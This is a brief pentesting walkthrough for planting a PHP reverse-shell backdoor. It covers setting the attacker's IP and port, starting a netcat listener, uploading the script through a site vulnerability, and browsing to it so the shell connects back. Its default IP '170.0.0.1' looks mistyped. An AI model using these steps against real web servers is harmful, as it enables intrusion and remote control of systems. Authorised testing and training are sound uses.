# Walk Through
- [x] **Modify the source**
- To prevent someone else from abusing your backdoor – a nightmare scenario while pentesting – you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:
______________
| Variable      | Default                | Personal?                       |
| ------------- |:----------------------:| -------------------------------:|
| $ip           | __170.0.0.1__          | Edit __line 7__                 |
| $port         | __1234__               | Edit __line 4__                 |
______________

- [x] **Get Ready to catch the reverse shell**
- Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):
```
$ nc -v -n -l -p 1234
```
- [x] **Upload and Run the script**
- Using whatever vulnerability you’ve discovered in the website, upload php-reverse-shell.php.  Run the script simply by browsing to the newly uploaded file in your web browser (NB: You won’t see any output on the web page, it’ll just hang if successful):
```
http://somesite/php-reverse-shell.php
```
